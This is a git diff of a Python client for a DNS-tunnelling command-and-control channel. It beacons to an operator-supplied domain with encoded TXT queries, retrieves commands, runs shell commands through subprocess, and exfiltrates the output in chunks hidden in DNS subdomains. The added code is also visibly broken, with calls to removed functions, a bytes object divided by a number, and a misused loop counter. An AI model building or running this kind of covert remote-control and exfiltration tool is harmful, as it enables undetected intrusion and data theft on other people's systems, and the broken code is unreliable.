@@ -4,6 +4,7 @@ import argparse
 import base64
 import datetime
 from time import sleep
+from textwrap import wrap
 import subprocess
 
 # colorize output
@@ -15,11 +16,14 @@ OM = '\x1b[0m'    # mischief managed
 maxAReq = 63
 maxResp = 253
 
-def decode(b64):
-    revert = b64.replace("-","=")
+def decode64(b64):
+    return base64.b64decode(str(b64,"UTF"))
+def encode64(plain):
+    return base64.b64encode(bytes(plain,"UTF"))
+def decode32(b32):
+    revert = b32.replace("-","=")
     return base64.b32decode(str(revert,"UTF"))
-
-def encode(plain):
+def encode32(plain):
     switch = plain.replace("=","-") # "equals" isn't allowed to play in domain names
     return base64.b32encode(bytes(switch,"UTF"))
 
@@ -50,9 +54,9 @@ def main():
         res.timeout = args.timeout
         while True:
             sleep(args.timeout)
-            subd = encode("CHK" + str(datetime.datetime.now())) # check in for commands
+            subd = encode32("CHK" + str(datetime.datetime.now())) # check in for commands
             answer = res.query(subd + args.domain, "TXT")
-            answer = decode(answer[0].to_text())[:3]
+            answer = decode64(answer[0].to_text())[:3]
             msgType = answer[:3]
             if msgType == "NUL": # nop if nothing from server
                 if debuggin: print(f"{OV}NUL from server{OM}")
@@ -64,15 +68,30 @@ def main():
                 cmdPktCt = int(answer[3:]) # how many lines long is the command?
                 command = ""
                 for i in range(cmdPktCt): # get all lines
-                    subd = encode("CON" + str(datetime.datetime.now()))
+                    subd = encode32("CON" + str(datetime.datetime.now()))
                     answer = res.query(subd + args.domain, "TXT")
-                    answer = decode(answer[0].to_text())[:3]
+                    answer = decode64(answer[0].to_text())[:3]
                     msgType = answer[:3]
                     command += answer[3:]
                 output = subprocess.check_output("cat /etc/services", shell=True)
-                codedOutput = encode(output)
-                respPktCt = int(codedOutput / 63) + 1 # number of packets to send response
-                
+                codedOutput = encode32(output)
+                respPktCt = int(codedOutput / 58) + 1 # number of packets to send response
+                subd = encode("HDR" + str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
+                answer = res.query(subd + args.domain, "TXT")
+                answer = decode(answer[0].to_text())[:3]
+                msgType = answer[:3]
+                chunks = wrap(output,58)
+                if msgType != "ACK":
+                    error = f"Expected 'ACK' from server, got {msgType}"
+                    print(OE + error + OM)
+                    raise Exception(error)
+                for chunk in chunks:
+                    subd = encode32("RES" + hex(i)[-2:] + chunk)
+                    answer = res.query(subd + args.domain, "TXT")
+                    if decode64(answer[0].to_text())[:5] != "ACK" + hex(i)[-2:]:
+                        error = f"Expected 'ACK{hex(i)[-2:]}' from server, got {decode64(answer[0].to_text())[:5]}"
+                        print(OE + error + OM)
+                        raise Exception(error)
             # if the answer comes back a certain way, make it a job
     except KeyboardInterrupt:
         pass
